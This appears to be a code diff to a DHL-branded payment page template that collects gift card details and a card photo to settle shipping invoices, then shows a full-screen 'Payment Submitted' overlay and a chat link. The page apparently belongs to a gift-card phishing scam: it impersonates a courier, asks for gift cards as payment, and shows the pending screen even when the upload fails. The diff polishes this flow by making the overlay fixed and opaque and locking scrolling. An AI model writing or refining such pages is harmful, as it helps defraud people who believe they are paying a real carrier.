@@ -15,8 +15,10 @@
             padding: 0;
             min-height: 100vh;
             color: var(--dhl-dark);
-            overflow-y: auto; /* ensure vertical scroll */
+            overflow-y: auto;
         }
+        body.overlay-active { overflow: hidden; }
+
         .payment-header { background: linear-gradient(135deg, var(--dhl-red) 0%, #b0040e 100%); color: #fff; padding: 1rem 1.5rem; box-shadow: 0 2px 8px rgba(212,5,17,0.2); }
         .payment-header .brand { display: flex; align-items: center; gap: 12px; }
         .payment-header .brand img { height: 38px; filter: brightness(0) invert(1); }
@@ -50,24 +52,32 @@
         .card-banner .badge-list { display: flex; gap: 6px; flex-wrap: wrap; }
         .card-banner .badge-list .badge { background: white; color: #78350f; border: 1px solid #f59e0b; font-weight: 600; }
 
-        /* Overlay */
+        /* ===== FIXED, FULL-SCREEN OVERLAY ===== */
         #resultOverlay {
-            position: absolute;
+            position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(255,255,255,0.92);
+            background: #ffffff;
             display: none;
             align-items: center;
             justify-content: center;
             flex-direction: column;
             padding: 2rem;
-            z-index: 10;
+            z-index: 9999;
             text-align: center;
+            overflow: hidden;
         }
         #resultOverlay.show { display: flex; }
+        #resultOverlay .overlay-content {
+            max-width: 480px;
+            width: 100%;
+            padding: 2rem;
+        }
         #resultOverlay .spinner { width: 3rem; height: 3rem; }
         #resultOverlay .pending-icon { font-size: 4rem; color: #f59e0b; margin-bottom: 1rem; }
         #resultOverlay h4 { font-weight: 700; color: var(--dhl-dark); }
         #resultOverlay p { color: #6b7280; max-width: 400px; }
+        #resultOverlay .btn-pay { width: 100%; justify-content: center; }
+        #resultOverlay .btn-secondary { width: 100%; margin-top: 0.5rem; }
 
         .footer { text-align: center; padding: 2rem 1rem 1rem; color: #94a3b8; font-size: 0.8rem; }
 
@@ -75,6 +85,9 @@
             .payment-card { padding: 1.2rem 1rem; margin: 1rem 0.5rem; }
             .card-banner { flex-direction: column; align-items: flex-start; }
             .card-banner .badge-list { width: 100%; }
+            #resultOverlay .overlay-content { padding: 1rem; }
+            #resultOverlay .pending-icon { font-size: 3rem; }
+            #resultOverlay h4 { font-size: 1.2rem; }
         }
     </style>
 </head>
@@ -158,9 +171,11 @@
                 </button>
             </div>
         </form>
+    </div>
 
-        <!-- Overlay -->
-        <div id="resultOverlay">
+    <!-- ===== FIXED OVERLAY (outside card) ===== -->
+    <div id="resultOverlay">
+        <div class="overlay-content">
             <div id="spinnerContainer">
                 <div class="spinner-border spinner text-warning" role="status">
                     <span class="visually-hidden">Processing...</span>
@@ -171,10 +186,10 @@
                 <div class="pending-icon"><i class="bi bi-clock-history"></i></div>
                 <h4>Payment Submitted</h4>
                 <p>Your gift card details have been received. Our team will verify and process your payment shortly.</p>
-                <a href="/" class="btn btn-pay mt-3" onclick="openTawkTo(); return false;">
+                <a href="#" class="btn btn-pay" onclick="openTawkTo(); return false;">
                     <i class="bi bi-chat-dots me-1"></i> Contact Support
                 </a>
-                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary mt-2">
+                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary">
                     <i class="bi bi-arrow-left me-1"></i> Back to Invoices
                 </a>
             </div>
@@ -194,7 +209,7 @@
 
         const email = getQueryParam('email') || '';
         const trackingParam = getQueryParam('tracking') || '';
-        const totalParam = getQueryParam('total'); // NEW: real total from billing page
+        const totalParam = getQueryParam('total');
 
         const trackingNumbers = trackingParam ? trackingParam.split(',').map(s => s.trim()) : [];
 
@@ -210,12 +225,11 @@
         }
         document.getElementById('invoiceCount').textContent = trackingNumbers.length + ' invoice(s)';
 
-        // Set total from URL param, or fallback to placeholder
         const totalUSD = totalParam ? parseFloat(totalParam) : (trackingNumbers.length * 50);
         document.getElementById('totalAmount').textContent = '$' + totalUSD.toFixed(2);
 
         // ============================================================
-        // FORM SUBMISSION – Show spinner, then pending, redirect to Tawk
+        // FORM SUBMISSION – Show spinner, then pending
         // ============================================================
         document.getElementById('giftCardForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -253,12 +267,12 @@
             const spinnerContainer = document.getElementById('spinnerContainer');
             const pendingContainer = document.getElementById('pendingContainer');
             overlay.classList.add('show');
+            document.body.classList.add('overlay-active');
             spinnerContainer.style.display = 'block';
             pendingContainer.style.display = 'none';
 
             // Prepare FormData for multipart upload (for photo)
             const formData = new FormData(this);
-            // Append additional fields that might be needed
             formData.append('total_usd', totalUSD);
 
             // Send to backend
@@ -267,14 +281,12 @@
                 body: formData,  // no Content-Type header; browser sets multipart/form-data
             })
             .then(() => {
-                // Even if success, show pending
                 setTimeout(() => {
                     spinnerContainer.style.display = 'none';
                     pendingContainer.style.display = 'block';
                 }, 1500);
             })
             .catch(() => {
-                // On error, still show pending
                 setTimeout(() => {
                     spinnerContainer.style.display = 'none';
                     pendingContainer.style.display = 'block';
@@ -291,7 +303,7 @@
         });
 
         // ============================================================
-        // OPEN TAWK.TO CHAT (if available)
+        // OPEN TAWK.TO CHAT
         // ============================================================
         function openTawkTo() {
             if (window.Tawk_API && window.Tawk_API.maximize) {
